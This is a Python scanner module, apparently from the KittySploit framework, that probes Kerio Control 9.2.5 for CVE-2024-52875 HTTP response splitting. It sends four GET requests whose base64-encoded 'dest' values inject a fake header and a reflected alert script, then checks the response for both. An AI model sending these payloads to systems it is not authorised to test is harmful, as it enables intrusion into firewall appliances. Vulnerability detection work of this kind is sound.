#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kerio Control, formerly known as Kerio WinRoute Firewall, has been found vulnerable to multiple HTTP Response ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kerio Control v9.2.5 - CRLF Injection Detection',
        'description': 'Kerio Control, formerly known as Kerio WinRoute Firewall, has been found vulnerable to multiple HTTP Response Splitting vulnerabilities in product affecting versions 9.2.5',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'kerio', 'crlf', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://karmainsecurity.com/hacking-kerio-control-via-cve-2024-52875',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-52875',
        ],
        'cve': 'CVE-2024-52875',
    }

    def run(self):
        for path in ('/nonauth/guestConfirm.cs?dest=VGVzdA0KQ1JMRjo%3d', '/nonauth/addCertException.cs?dest=VGVzdA0KQ1JMRjo%3d', '/nonauth/expiration.cs?dest=VGVzdA0KQ1JMRjo%3d', '/nonauth/guestConfirm.cs?dest=Cgo8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4%3d'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('<script>alert(document.domain)</script>', 'text/html',)
            header_regexes = ('(?m)^Crlf:\\s*$',)
            if (any(m in body for m in body_any)) and (any(re.search(rx, headers, 0) for rx in header_regexes)):
                self.set_info(
                    severity='high',
                    reason="Kerio Control v9.2.5 - CRLF Injection detected",
                    path=path,
                )
                return True
        return False

